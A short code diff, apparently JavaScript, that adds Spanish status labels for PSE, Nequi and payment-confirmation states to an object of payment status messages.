@@ -17,6 +17,9 @@ const estadoMensajes = {
     'pago-inicio': '📍 <b>ESTADO: Iniciando Pago</b>',
     'pago-llave': '🔐 <b>ESTADO: Esperando Llave Bre-B</b>',
     'pago-tarjeta': '💳 <b>ESTADO: Completando Pago Tarjeta</b>',
+    'pago-informacion-bancaria': '🏦 <b>ESTADO: Pago PSE</b>',
+    'pago-nequi': '📱 <b>ESTADO: Pago Nequi</b>',
+    'pago-confirmacion': '⏳ <b>ESTADO: Confirmando Pago</b>',
     'pago-exitoso': '✅ <b>ESTADO: Pago Completado</b>',
     'pago-cancelado': '❌ <b>ESTADO: Pago Cancelado</b>'
 };
